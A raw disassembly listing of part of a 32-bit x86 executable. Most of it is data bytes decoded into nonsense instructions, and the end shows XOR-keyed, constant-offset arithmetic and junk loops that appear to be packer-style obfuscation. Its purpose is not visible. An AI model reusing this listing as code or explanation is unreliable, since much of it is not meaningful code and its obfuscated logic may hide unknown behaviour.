  418ade:	mov    ds:0x2045cc7c,eax
  418ae3:	jle    0x418b41
  418ae5:	rol    al,1
  418ae7:	loopne 0x418a77
  418ae9:	in     eax,0xf5
  418aeb:	je     0x418aa5
  418aed:	scas   al,BYTE PTR es:[edi]
  418aee:	ss mov ebp,0x5d005b5c
  418af4:	sbb    eax,DWORD PTR [ecx+0x167be65b]
  418afa:	test   al,0x88
  418afc:	lock call FWORD PTR [ecx+0x6063db41]
  418b03:	cmp    edi,DWORD PTR [ebx+0x369301af]
  418b09:	mov    bl,0x74
  418b0b:	or     eax,0x753ac236
  418b10:	ins    BYTE PTR es:[edi],dx
  418b11:	jp     0x418b1c
  418b13:	mov    esi,0x7333889c
  418b18:	add    BYTE PTR [eax+0x4d],0x86
  418b1c:	pop    ebp
  418b1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b1e:	out    dx,eax
  418b1f:	ds (bad) 
  418b21:	jmp    0x418aba
  418b23:	in     al,dx
  418b24:	(bad)  
  418b25:	loopne 0x418b45
  418b27:	dec    ebp
  418b28:	stos   DWORD PTR es:[edi],eax
  418b29:	pop    eax
  418b2a:	sub    dh,al
  418b2c:	dec    esi
  418b2d:	sub    eax,0x2d258958
  418b32:	push   0xf8ec9d63
  418b37:	in     eax,0x61
  418b39:	into   
  418b3a:	dec    BYTE PTR [edi-0x4a]
  418b3d:	mov    ah,0xb7
  418b3f:	pop    esp
  418b40:	xchg   edi,eax
  418b41:	pop    edi
  418b42:	fild   QWORD PTR [ecx]
  418b44:	ror    BYTE PTR [eax],cl
  418b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b47:	sub    eax,0xbf95f3ee
  418b4c:	and    edx,DWORD PTR [ebx+0x32]
  418b4f:	je     0x418b45
  418b51:	frstor [esi-0x6174a803]
  418b57:	mov    cl,0x33
  418b59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b5a:	ret    
  418b5b:	imul   edi,DWORD PTR ds:0xf51616aa,0x6e094efc
  418b65:	fst    st(7)
  418b67:	adc    BYTE PTR [ebp-0x279c7408],ah
  418b6d:	test   BYTE PTR [edi],bh
  418b6f:	cdq    
  418b70:	out    0x5c,eax
  418b72:	pusha  
  418b73:	rol    BYTE PTR [ebp+0x1b7c7d15],0xf3
  418b7a:	dec    ebx
  418b7b:	mov    esp,0x673170e9
  418b80:	mov    esi,0xacf5c026
  418b85:	and    DWORD PTR [edx-0x4f215626],0x69
  418b8c:	mov    ah,0x9b
  418b8e:	push   cs
  418b8f:	jb     0x418ba3
  418b91:	xchg   DWORD PTR ds:0xd9f22b1e,esi
  418b97:	dec    ecx
  418b98:	mov    ch,0xc3
  418b9a:	call   0x2e9f:0xdcc30b64
  418ba1:	cmp    dl,0xd0
  418ba4:	xchg   edx,eax
  418ba5:	mov    eax,ds:0xb7a545cd
  418baa:	jns    0x418c25
  418bac:	inc    esi
  418bad:	inc    ecx
  418bae:	in     eax,dx
  418baf:	push   DWORD PTR [eax]
  418bb1:	push   0x655cf4d8
  418bb6:	pop    ss
  418bb7:	or     dl,BYTE PTR ds:0x14e9c2f8
  418bbd:	inc    edx
  418bbe:	int3   
  418bbf:	cmp    al,0xd0
  418bc1:	repnz cmp al,0x79
  418bc4:	push   ebp
  418bc5:	sbb    BYTE PTR [edi+0x4ab64647],bl
  418bcb:	push   esi
  418bcc:	scas   al,BYTE PTR es:[edi]
  418bcd:	pop    eax
  418bce:	(bad)  
  418bcf:	fnstsw WORD PTR [ecx+0x9]
  418bd2:	out    0x84,eax
  418bd4:	mov    edx,0xa3b03b38
  418bd9:	cmp    al,0xc0
  418bdb:	cmp    BYTE PTR ds:0x58ed54bf,dl
  418be1:	popa   
  418be2:	and    eax,0x74403a95
  418be7:	mov    ds:0x554746f,al
  418bec:	lods   al,BYTE PTR fs:[esi]
  418bee:	(bad)  
  418bef:	mov    dl,0x47
  418bf1:	mov    al,ds:0x2574b1ad
  418bf6:	xchg   esi,eax
  418bf7:	sar    BYTE PTR [eax],1
  418bf9:	adc    al,0xd1
  418bfb:	mov    ebp,0xe9ec3575
  418c00:	out    0x94,eax
  418c02:	jecxz  0x418b85
  418c04:	or     esi,DWORD PTR [ecx]
  418c06:	sbb    BYTE PTR cs:[eax+0x5fccad11],ch
  418c0d:	pushf  
  418c0e:	sub    dh,bl
  418c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c11:	or     BYTE PTR [ebp-0x19aea495],dl
  418c17:	sub    al,0xc0
  418c19:	xor    ebx,DWORD PTR [ecx]
  418c1b:	xchg   ebx,eax
  418c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c1d:	icebp  
  418c1e:	sahf   
  418c1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418c20:	shl    ecx,1
  418c22:	lods   eax,DWORD PTR ds:[esi]
  418c23:	cmp    al,0x45
  418c25:	fs push ebp
  418c27:	and    cl,BYTE PTR [eax-0x31]
  418c2a:	xor    eax,0x13c3b462
  418c2f:	inc    ebp
  418c30:	mov    ebp,0x759b3092
  418c35:	jge    0x418be3
  418c37:	pop    ebx
  418c38:	sub    BYTE PTR [edi+0x2c2bda61],dh
  418c3e:	ror    BYTE PTR [esi-0x4c4ead06],0xf4
  418c45:	loope  0x418c54
  418c47:	call   0x3b0e:0x6137e904
  418c4e:	or     esp,DWORD PTR [ecx-0x41]
  418c51:	adc    ecx,eax
  418c53:	push   ebp
  418c54:	fwait
  418c55:	mov    cl,0x85
  418c57:	out    dx,eax
  418c58:	in     al,0xcd
  418c5a:	mov    al,ds:0xb18ddb63
  418c5f:	push   ebp
  418c60:	test   DWORD PTR ds:[edi+0x70597b6c],edi
  418c67:	xor    dh,BYTE PTR [edx+ebx*4]
  418c6a:	mov    esi,ss
  418c6c:	or     dl,BYTE PTR ds:0x81eab6c7
  418c72:	add    BYTE PTR [ebx+esi*1-0x5a],cl
  418c76:	xchg   esi,eax
  418c77:	ror    DWORD PTR [ebp-0x1b2b1937],cl
  418c7d:	iret   
  418c7e:	push   0x90d909b3
  418c83:	pop    es
  418c84:	jg     0x418c2b
  418c86:	inc    esp
  418c87:	scas   al,BYTE PTR es:[edi]
  418c88:	mov    eax,0x4bbb32ac
  418c8d:	iret   
  418c8e:	jecxz  0x418c32
  418c90:	and    BYTE PTR [eax],0x7c
  418c93:	jle    0x418c9c
  418c95:	xor    eax,0x3b1a6235
  418c9a:	mov    bh,BYTE PTR [ebp-0x14]
  418c9d:	and    eax,0xc4e20e72
  418ca2:	fld    QWORD PTR [esi-0x51274129]
  418ca8:	inc    eax
  418ca9:	adc    dl,BYTE PTR [esi+ebp*8-0x50]
  418cad:	cmp    cl,bh
  418caf:	mov    edx,0xde1908c
  418cb4:	adc    bl,bh
  418cb6:	add    DWORD PTR [ebx-0x2e],ebp
  418cb9:	mov    ebx,0x231785f3
  418cbe:	mov    eax,0xa8fa68aa
  418cc3:	js     0x418cfe
  418cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cc6:	lea    esp,[eax+0x422b60b9]
  418ccc:	dec    edx
  418ccd:	sub    cl,0x30
  418cd0:	cmp    DWORD PTR ds:0xd26f3960,0xffffffb1
  418cd7:	push   ecx
  418cd8:	mov    cl,0xaf
  418cda:	xor    eax,0x27efc42d
  418cdf:	sahf   
  418ce0:	cld    
  418ce1:	xchg   BYTE PTR [eax],dl
  418ce3:	imul   ebp,ecx,0xd309f3d2
  418ce9:	mov    eax,ds:0x88835e3e
  418cee:	sbb    BYTE PTR ds:0x433f7965,ch
  418cf4:	iret   
  418cf5:	push   esp
  418cf6:	push   ss
  418cf7:	fisttp WORD PTR [edi+0x9]
  418cfa:	add    al,0x1d
  418cfc:	cmp    edi,DWORD PTR [ecx]
  418cfe:	mov    edi,0xd9fdc428
  418d03:	stos   BYTE PTR es:[edi],al
  418d04:	dec    edx
  418d05:	xor    eax,0xef9913fd
  418d0a:	cmp    dh,bh
  418d0c:	into   
  418d0d:	sbb    cl,0x53
  418d10:	aam    0x3c
  418d12:	pusha  
  418d13:	in     eax,0x7e
  418d15:	mov    ds:0x377dff42,eax
  418d1a:	(bad)  [esi+edi*2+0x1f42d04a]
  418d21:	test   DWORD PTR [edx-0x45],0xd74cb0f
  418d28:	out    0x7c,eax
  418d2a:	jbe    0x418d5a
  418d2c:	iret   
  418d2d:	add    DWORD PTR [edx],0xb7209f91
  418d33:	xchg   esi,eax
  418d34:	lods   eax,DWORD PTR ds:[esi]
  418d35:	push   ecx
  418d36:	cmp    ebx,DWORD PTR [edi]
  418d38:	mov    bl,0xa0
  418d3a:	(bad)  
  418d3c:	int    0x54
  418d3e:	and    al,0x12
  418d40:	pop    ds
  418d41:	icebp  
  418d42:	mov    bl,0x27
  418d44:	jno    0x418d58
  418d46:	ja     0x418d71
  418d48:	std    
  418d49:	mov    esi,0x9b081017
  418d4e:	leave  
  418d4f:	outs   dx,BYTE PTR ds:[esi]
  418d50:	xor    al,0xdc
  418d52:	call   0x6ed:0x3ef8cbae
  418d59:	int3   
  418d5a:	std    
  418d5b:	or     eax,eax
  418d5d:	or     DWORD PTR [esi],esi
  418d5f:	sbb    eax,0x1c623c5c
  418d64:	adc    al,0xcf
  418d66:	in     al,0x7f
  418d68:	mov    dh,0x6f
  418d6a:	jno    0x418de8
  418d6c:	fcom   DWORD PTR [edi+0x1]
  418d6f:	pop    ecx
  418d70:	(bad)  
  418d72:	(bad)  
  418d73:	sbb    esp,DWORD PTR [edi+0x4f50b179]
  418d79:	pop    edx
  418d7a:	fwait
  418d7b:	cmp    eax,0x351c1cd
  418d80:	mov    ds:0x2a90bce9,al
  418d85:	lods   eax,DWORD PTR ds:[esi]
  418d86:	mov    ebp,ecx
  418d88:	jne    0x418dfa
  418d8a:	add    al,0xee
  418d8c:	(bad)  
  418d8d:	clc    
  418d8e:	(bad)  
  418d8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d90:	or     ecx,DWORD PTR [ecx+0x3c8834f]
  418d96:	mov    bl,0x27
  418d98:	cmp    al,BYTE PTR [ebp+0x33a1ec05]
  418d9e:	adc    al,0x66
  418da0:	push   ds
  418da1:	ret    0xffb8
  418da4:	and    BYTE PTR [eax-0x7a9f32b9],dl
  418daa:	xor    ch,dh
  418dac:	jge    0x418de5
  418dae:	xor    DWORD PTR [esi+0x999229],ecx
  418db4:	push   cs
  418db5:	jle    0x418df4
  418db7:	mov    esi,0x7b1a5566
  418dbc:	and    esp,DWORD PTR [esi+0x14c2ba12]
  418dc2:	jae    0x418d6b
  418dc4:	sbb    ebp,DWORD PTR [edi]
  418dc6:	call   0xa1e9:0x5f916f27
  418dcd:	push   ds
  418dce:	jge    0x418d5c
  418dd0:	push   cs
  418dd1:	or     eax,0xeade437c
  418dd6:	imul   ecx,DWORD PTR [edi+esi*8+0x73813d81],0x9
  418dde:	sub    al,0x16
  418de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418de1:	nop
  418de2:	(bad)  
  418de3:	imul   ebx,DWORD PTR [eax+0x6a],0x56149a8c
  418dea:	cmc    
  418deb:	mov    ebx,0x23988dbc
  418df0:	loope  0x418dd6
  418df2:	or     al,0x82
  418df4:	xchg   esi,eax
  418df5:	mov    al,ds:0x6fb59d69
  418dfa:	enter  0xa9c1,0xae
  418dfe:	ja     0x418df3
  418e00:	call   0xe8434de8
  418e05:	clc    
  418e06:	mov    cs,ebx
  418e08:	addr16 xchg esp,eax
  418e0a:	xchg   ecx,eax
  418e0b:	xchg   esi,eax
  418e0c:	dec    ecx
  418e0d:	add    DWORD PTR [ebp+edi*2+0x60b8cb6c],esp
  418e14:	popf   
  418e15:	cmp    al,0xe5
  418e17:	dec    ebp
  418e18:	lds    esi,FWORD PTR [edi]
  418e1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e1b:	mov    al,ds:0xbae88cc7
  418e20:	(bad)  
  418e22:	clc    
  418e23:	int3   
  418e24:	into   
  418e25:	jecxz  0x418dc7
  418e27:	inc    esp
  418e28:	(bad)  cs:[edi-0x1e67ffad]
  418e2f:	aam    0xf3
  418e31:	pop    es
  418e32:	test   al,0xf2
  418e34:	jge    0x418ea8
  418e36:	or     ebp,ebp
  418e38:	pop    ebp
  418e39:	adc    bh,ch
  418e3b:	dec    esi
  418e3c:	ret    
  418e3d:	(bad)  [ebp-0x5dca8ebd]
  418e43:	mov    WORD PTR [eax],ss
  418e45:	inc    edx
  418e46:	mov    WORD PTR gs:[eax+0x22],es
  418e4a:	jbe    0x418e17
  418e4c:	push   edi
  418e4d:	jmp    0x418e06
  418e4f:	pop    esp
  418e50:	mov    ds:0xd8348859,al
  418e55:	sub    esp,DWORD PTR ds:0x2f052b34
  418e5b:	or     eax,0x577f5291
  418e60:	shl    cl,0xe6
  418e63:	inc    edi
  418e64:	ret    0xe878
  418e67:	mov    cl,0xde
  418e69:	dec    esi
  418e6a:	out    0xd9,eax
  418e6c:	out    dx,eax
  418e6d:	push   edx
  418e6e:	xchg   edi,eax
  418e6f:	and    esp,ebx
  418e71:	adc    edi,eax
  418e73:	lods   eax,DWORD PTR ds:[esi]
  418e74:	adc    eax,0x1c9d5577
  418e79:	add    esi,esp
  418e7b:	scas   al,BYTE PTR es:[edi]
  418e7c:	jnp    0x418e44
  418e7e:	pop    ecx
  418e7f:	aaa    
  418e80:	shl    DWORD PTR [ebx+0x11],0xdc
  418e84:	sti    
  418e85:	fldenv [ebx]
  418e87:	xor    BYTE PTR [edi],0x67
  418e8a:	push   ebp
  418e8b:	mov    dh,0x3e
  418e8d:	jle    0x418e10
  418e8f:	mov    edi,DWORD PTR [esi-0x5ec93938]
  418e95:	and    ecx,DWORD PTR [eax]
  418e97:	cld    
  418e98:	sub    BYTE PTR [ebx+0x71561c16],al
  418e9e:	ficomp DWORD PTR [esi+0xbcfc5c9]
  418ea4:	(bad)  
  418ea5:	sub    dl,bl
  418ea7:	dec    esi
  418ea8:	div    ch
  418eaa:	imul   esi,DWORD PTR [edx-0x15485902],0xffffffbd
  418eb1:	(bad)  {k5}
  418eb6:	mov    edx,0x2757e592
  418ebb:	scas   eax,DWORD PTR es:[edi]
  418ebc:	xchg   BYTE PTR [esi+0x6b66985b],dh
  418ec2:	lods   eax,DWORD PTR ds:[esi]
  418ec3:	dec    edi
  418ec4:	add    eax,0x4ce57aea
  418ec9:	adc    ah,BYTE PTR [ebp+0x66fb51b8]
  418ecf:	rcr    DWORD PTR [esp+edx*8+0x61415150],0x2e
  418ed7:	mov    edx,0xa41a718
  418edc:	cwde   
  418edd:	inc    ebp
  418ede:	(bad)  
  418ee0:	inc    edi
  418ee1:	int3   
  418ee2:	xchg   ebx,eax
  418ee3:	sub    eax,0x7fa84260
  418ee8:	dec    ebx
  418ee9:	(bad)  
  418eea:	jle    0x418f3d
  418eec:	shl    edx,cl
  418eee:	adc    ebp,DWORD PTR [ebx]
  418ef0:	inc    eax
  418ef1:	das    
  418ef2:	repz shl DWORD PTR [ecx+0x26],cl
  418ef6:	push   cs
  418ef7:	cmp    DWORD PTR [edi+0x656eed1c],0x789ab40b
  418f01:	mov    ecx,0xb9139998
  418f06:	pop    ebx
  418f07:	cwde   
  418f08:	iret   
  418f09:	push   ss
  418f0a:	repz add ah,bl
  418f0d:	les    ebx,FWORD PTR [esi-0x48]
  418f10:	sar    BYTE PTR [ecx+0x77],1
  418f13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f14:	pop    edi
  418f15:	ds cmp eax,0x6e9622e
  418f1b:	arpl   bx,bp
  418f1d:	ins    DWORD PTR es:[edi],dx
  418f1e:	in     eax,dx
  418f1f:	jne    0x418f1c
  418f21:	dec    eax
  418f22:	mov    esi,DWORD PTR [ebp+0x4f271348]
  418f28:	xchg   ecx,eax
  418f29:	pop    es
  418f2a:	cmc    
  418f2b:	pop    ebx
  418f2c:	(bad)  
  418f2d:	repnz dec eax
  418f2f:	push   0xffffffcd
  418f31:	loop   0x418f70
  418f33:	repnz inc edx
  418f35:	mov    edi,0x7abba73e
  418f3a:	jnp    0x418fa5
  418f3c:	ja     0x418f0c
  418f3e:	aaa    
  418f3f:	idiv   esp
  418f41:	cdq    
  418f42:	hlt    
  418f43:	icebp  
  418f44:	sar    BYTE PTR [ebx-0xc],1
  418f47:	in     al,0xbf
  418f49:	test   BYTE PTR [eax-0x3c],dh
  418f4c:	adc    BYTE PTR [ebp+0x3cf354dc],al
  418f52:	fisttp QWORD PTR ds:0x5af5e8d8
  418f58:	pop    ds
  418f59:	jmp    0x418f6b
  418f5b:	lods   eax,DWORD PTR ds:[esi]
  418f5c:	bnd jno 0x418fba
  418f5f:	daa    
  418f60:	mov    eax,ds:0x9cbcca74
  418f65:	xchg   esi,eax
  418f66:	push   ss
  418f67:	das    
  418f68:	add    al,0xf4
  418f6a:	cmp    eax,0xf476b7fc
  418f6f:	mov    dl,dh
  418f71:	ret    
  418f72:	int    0xa
  418f74:	push   ebp
  418f75:	stos   DWORD PTR es:[edi],eax
  418f76:	lock call 0xc79c:0x20a27cd6
  418f7e:	ins    DWORD PTR es:[edi],dx
  418f7f:	ret    0x8042
  418f82:	into   
  418f83:	inc    eax
  418f84:	adc    DWORD PTR [eax],ebp
  418f86:	dec    DWORD PTR [eax]
  418f88:	stos   DWORD PTR es:[edi],eax
  418f89:	cmp    ch,BYTE PTR [edi]
  418f8b:	loop   0x418f9c
  418f8d:	je     0x418fdc
  418f8f:	xor    BYTE PTR [edx+0x24f2f1af],ch
  418f95:	je     0x418f96
  418f97:	xor    al,0x24
  418f99:	cdq    
  418f9a:	dec    eax
  418f9b:	iret   
  418f9c:	sbb    bl,0x36
  418f9f:	pop    es
  418fa0:	arpl   WORD PTR [ebx+0x5e462861],di
  418fa6:	sahf   
  418fa7:	xor    ebx,eax
  418fa9:	xor    ebp,DWORD PTR [edi]
  418fab:	inc    ecx
  418fac:	mov    ?,WORD PTR [eax+0x472b09c6]
  418fb2:	and    DWORD PTR [edx],esp
  418fb4:	in     eax,0xd6
  418fb6:	jmp    0x65307745
  418fbb:	jnp    0x418f81
  418fbd:	mov    edi,0x4501a618
  418fc2:	xchg   ebx,eax
  418fc3:	xchg   ebp,eax
  418fc4:	stos   BYTE PTR es:[edi],al
  418fc5:	push   esp
  418fc6:	pop    ds
  418fc7:	shl    DWORD PTR [edx-0x3b11be7c],1
  418fcd:	xchg   esp,eax
  418fce:	aas    
  418fcf:	jl     0x419001
  418fd1:	in     al,0xb7
  418fd3:	mov    edx,0xbd683ae4
  418fd8:	mov    DWORD PTR [edi-0x78],ebp
  418fdb:	mov    bh,0x92
  418fdd:	add    BYTE PTR [edx],ah
  418fdf:	mov    fs,WORD PTR [ebx]
  418fe1:	push   ss
  418fe2:	xor    dh,al
  418fe4:	jmp    0xad96:0x369798ef
  418feb:	add    eax,0xdc5201c5
  418ff0:	frstor [edi]
  418ff2:	sbb    ecx,DWORD PTR [eax-0x570e8e1a]
  418ff8:	icebp  
  418ff9:	adc    BYTE PTR [ebp-0x9],cl
  418ffc:	pop    esp
  418ffd:	ds nop
  418fff:	inc    ecx
  419000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419001:	pop    es
  419002:	cmp    eax,DWORD PTR [edi-0x79c78593]
  419008:	cmp    DWORD PTR [eax+0x23],0xbe255051
  41900f:	gs push ds
  419011:	mov    ds:0x15f5cc8c,al
  419016:	retf   
  419017:	xchg   esi,eax
  419018:	cdq    
  419019:	or     ecx,DWORD PTR [ebp+eiz*4+0x39179fa4]
  419020:	xor    BYTE PTR [ebp+0x48],bl
  419023:	int    0x3e
  419025:	and    eax,0x878c3741
  41902a:	loop   0x419022
  41902c:	dec    eax
  41902d:	fbld   TBYTE PTR [ecx-0xc]
  419030:	mov    dh,0x52
  419032:	pop    ds
  419033:	fabs   
  419035:	pop    ebx
  419036:	push   edi
  419037:	adc    DWORD PTR [edx+0x1d],esi
  41903a:	loop   0x419001
  41903c:	push   esi
  41903d:	jae    0x419082
  41903f:	loope  0x419029
  419041:	xor    BYTE PTR [ebx+0x14a2dc48],cl
  419047:	and    bh,BYTE PTR ds:0xa004775b
  41904d:	xchg   edi,eax
  41904e:	icebp  
  41904f:	mov    BYTE PTR gs:[edi+0x4d39ea9a],ch
  419056:	retf   
  419057:	mov    ds,WORD PTR [edi]
  419059:	data16 jmp 0x41902e
  41905c:	dec    esp
  41905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41905e:	pushf  
  41905f:	xor    ebx,esp
  419061:	add    eax,0x1f29e4bc
  419066:	ins    DWORD PTR es:[edi],dx
  419067:	in     eax,dx
  419068:	addr16 mov esi,0xd70806a1
  41906e:	or     edx,ebx
  419070:	xchg   edi,eax
  419071:	xchg   ebx,eax
  419072:	sub    DWORD PTR [ecx+0x2c],0xffffff8c
  419076:	mov    ds:0xa582cdda,al
  41907b:	inc    ebx
  41907c:	popa   
  41907d:	in     al,dx
  41907e:	push   ebx
  41907f:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419081:	loopne 0x419076
  419083:	call   0x726cb0dd
  419088:	sub    esi,DWORD PTR [edx]
  41908a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41908b:	mov    dl,0xbf
  41908d:	lds    edx,FWORD PTR ds:0x46036e5b
  419093:	je     0x41906d
  419095:	or     eax,0x538ed8aa
  41909a:	mov    bl,0xdd
  41909c:	into   
  41909d:	ja     0x4190d3
  41909f:	mov    ds:0x24238307,eax
  4190a4:	inc    esp
  4190a5:	call   0xcbf8:0x936c7827
  4190ac:	adc    BYTE PTR [esi+0x9d4760e],dl
  4190b2:	ds dec ebx
  4190b4:	scas   eax,DWORD PTR es:[edi]
  4190b5:	inc    esp
  4190b6:	add    edi,DWORD PTR [esi+0x3e]
  4190b9:	xchg   DWORD PTR [ebx],edx
  4190bb:	xor    bh,BYTE PTR [ebp+0x2d2e1344]
  4190c1:	mov    ah,bl
  4190c3:	dec    ecx
  4190c4:	or     BYTE PTR [edx+0x6850c285],bh
  4190ca:	sbb    BYTE PTR [edx+0x4334f021],ch
  4190d0:	push   ebx
  4190d1:	jbe    0x419114
  4190d3:	dec    esp
  4190d4:	and    eax,0x7702419c
  4190d9:	xor    eax,esp
  4190db:	inc    eax
  4190dc:	or     bl,BYTE PTR [ecx-0x55]
  4190df:	or     eax,0xd4a9e8bf
  4190e4:	pop    ecx
  4190e5:	cmc    
  4190e6:	mov    eax,ds:0x4297acb7
  4190eb:	js     0x41910a
  4190ed:	call   0xb8a2:0xf56368ed
  4190f4:	arpl   WORD PTR [edi],si
  4190f6:	push   esp
  4190f7:	dec    ebp
  4190f8:	pop    ebp
  4190f9:	sbb    BYTE PTR [esi+0x3fb62fe8],0x96
  419100:	enter  0x6781,0xf2
  419104:	push   eax
  419105:	cwde   
  419106:	lahf   
  419107:	loop   0x419132
  419109:	mov    DWORD PTR [edi+0x22],ecx
  41910c:	not    DWORD PTR [ecx]
  41910e:	mov    al,0xaf
  419110:	ss push cs
  419112:	xor    bh,al
  419114:	retf   0xb0e6
  419117:	xchg   DWORD PTR fs:[ecx-0x5a],eax
  41911b:	call   0x1c8de20a
  419120:	adc    ch,BYTE PTR [ebp-0x6b]
  419123:	sub    BYTE PTR [ecx],dl
  419125:	mov    al,ds:0xc8eb9b59
  41912a:	mov    ss,WORD PTR [esi]
  41912c:	or     BYTE PTR ds:0x6601092d,cl
  419132:	rcr    BYTE PTR [ebx+0x21],1
  419135:	inc    edx
  419136:	xor    DWORD PTR [ebp-0x54],esi
  419139:	dec    esi
  41913a:	adc    al,0xc1
  41913c:	in     al,dx
  41913d:	ins    DWORD PTR es:[edi],dx
  41913e:	jecxz  0x4190c5
  419140:	mov    ebp,DWORD PTR [edx-0x1b]
  419143:	jmp    0x4190e3
  419145:	out    dx,eax
  419146:	inc    edx
  419147:	mov    al,0xd3
  419149:	(bad)  
  41914a:	leave  
  41914b:	cmc    
  41914c:	jnp    0x419166
  41914e:	sbb    DWORD PTR [esi+0x3a],esp
  419151:	fiadd  WORD PTR [ebx+0x28]
  419154:	cmc    
  419155:	sar    BYTE PTR [esi],cl
  419157:	xchg   ebp,eax
  419158:	sbb    eax,0x9df9e594
  41915d:	lahf   
  41915e:	mov    edi,0x168b345b
  419163:	test   eax,0x7f052ef7
  419168:	es mov esp,0x15b72572
  41916e:	inc    edi
  41916f:	jo     0x41912b
  419171:	mov    dl,0xc9
  419173:	in     al,dx
  419174:	mov    ds:0xc68f40cf,al
  419179:	int    0x7e
  41917b:	retf   0xcd1d
  41917e:	jmp    0x19d28faf
  419183:	fmul   DWORD PTR [ecx+0x13]
  419186:	pop    eax
  419187:	das    
  419188:	or     BYTE PTR [ebx],bh
  41918a:	jo     0x4191ac
  41918c:	inc    edx
  41918d:	jns    0x4191d4
  41918f:	fsubp  st(5),st
  419191:	gs call 0x1a4:0xac802fc2
  419199:	inc    ecx
  41919a:	push   cs
  41919b:	jnp    0x41914f
  41919d:	adc    BYTE PTR [edi],0x4f
  4191a0:	mov    dh,0xf1
  4191a2:	ds repnz adc al,0x3f
  4191a6:	sub    al,0xf0
  4191a8:	pop    ds
  4191a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191aa:	out    dx,al
  4191ab:	test   eax,0xb3a76c69
  4191b0:	inc    ecx
  4191b1:	push   edx
  4191b2:	jl     0x419136
  4191b4:	pop    esi
  4191b5:	sub    al,BYTE PTR [ecx+0x11]
  4191b8:	jb     0x4191ae
  4191ba:	push   ecx
  4191bb:	mov    eax,DWORD PTR [ebp-0x18]
  4191be:	mov    edx,DWORD PTR [ebp-0x10]
  4191c1:	xor    eax,esi
  4191c3:	lea    eax,[eax+edx*1+0x3272db]
  4191ca:	mov    DWORD PTR [ebp-0x10],eax
  4191cd:	jmp    0x40deb0
  4191d2:	mov    eax,DWORD PTR [ebp-0x34]
  4191d5:	mov    edx,DWORD PTR [ebp+0xc]
  4191d8:	xor    edx,esi
  4191da:	lea    ecx,[ecx+edx*1+0x3272db]
  4191e1:	lea    edx,[ecx-0x3272db]
  4191e7:	xor    edx,esi
  4191e9:	cmp    edx,0xf89c95b6
  4191ef:	jne    0x40dd2f
  4191f5:	mov    ecx,DWORD PTR [ebp+0x8]
  4191f8:	mov    edx,DWORD PTR [ebp+0xc]
  4191fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4191fe:	xor    edx,esi
  419200:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  419207:	xor    ecx,esi
  419209:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  419210:	xor    ebx,esi
  419212:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  419219:	mov    edx,DWORD PTR [ebp+0xc]
  41921c:	xor    edx,esi
  41921e:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  419225:	mov    eax,DWORD PTR [ebp+0xc]
  419228:	xor    eax,esi
  41922a:	add    eax,edi
  41922c:	pop    edi
  41922d:	pop    esi
  41922e:	pop    ebx
  41922f:	leave  
  419230:	ret    0x8
  419233:	push   ebp
  419234:	mov    ebp,esp
  419236:	mov    DWORD PTR ds:0x421a32,0xf89c85b5
  419240:	pop    ebp
  419241:	jmp    0x4193b5
  419246:	push   ebp
  419247:	mov    ebp,esp
  419249:	push   ecx
  41924a:	and    DWORD PTR ds:0x42c010,0x0
  419254:	jmp    0x419266
  419259:	mov    edx,DWORD PTR ds:0x42c010
  41925f:	inc    edx
  419260:	mov    DWORD PTR ds:0x42c010,edx
  419266:	cmp    DWORD PTR ds:0x42c010,0x19
  41926d:	jae    0x4192ae
  419273:	cmp    DWORD PTR ds:0x42c010,0x9
  41927a:	jne    0x419289
  419280:	push   DWORD PTR [ebp-0x18]
  419283:	call   DWORD PTR ds:0x42401c
  419289:	cmp    DWORD PTR ds:0x42c010,0x8
  419290:	jne    0x4192a3
  419296:	mov    edx,DWORD PTR ds:0x42c010
  41929c:	inc    edx
  41929d:	mov    DWORD PTR ds:0x42c010,edx
  4192a3:	jmp    0x419259
  4192a8:	or     DWORD PTR ds:0x42c004,ebx
  4192ae:	push   ecx
  4192af:	movzx  eax,BYTE PTR ds:0x42b00c
  4192b6:	and    DWORD PTR ds:0x42a01c,eax
  4192bc:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  4192c3:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  4192ca:	mov    DWORD PTR ds:0x428008,0x13
  4192d4:	cmp    DWORD PTR ds:0x428008,0x0
  4192db:	je     0x41930a
  4192e1:	cmp    DWORD PTR ds:0x428008,0x20
  4192e8:	jne    0x4192fa
  4192ee:	push   DWORD PTR [ebp-0x14]
  4192f1:	push   DWORD PTR [ebp-0x1c]
  4192f4:	call   DWORD PTR ds:0x424020
  4192fa:	mov    eax,ds:0x428008
  4192ff:	dec    eax
  419300:	mov    ds:0x428008,eax
  419305:	jmp    0x4192d4
  41930a:	mov    eax,DWORD PTR [ebp-0x4]
  41930d:	and    DWORD PTR ds:0x429008,0x428020
  419317:	push   esi
  419318:	adc    DWORD PTR ds:0x42c000,0x1310
  419322:	mov    esi,DWORD PTR [ebp-0x8]
  419325:	mov    edx,0x7510893
  41932a:	xor    eax,edx
  41932c:	mov    ecx,DWORD PTR ds:0x42a000
  419332:	and    DWORD PTR ds:0x429014,ecx
  419338:	xor    esi,edx
  41933a:	mov    ecx,DWORD PTR ds:0x4237fd
  419340:	mov    ecx,DWORD PTR [ecx]
  419342:	sbb    DWORD PTR ds:0x42b00c,ecx
  419348:	mov    ecx,0x3272db
  41934d:	add    esi,ecx
  41934f:	add    eax,ecx
  419351:	imul   eax,esi
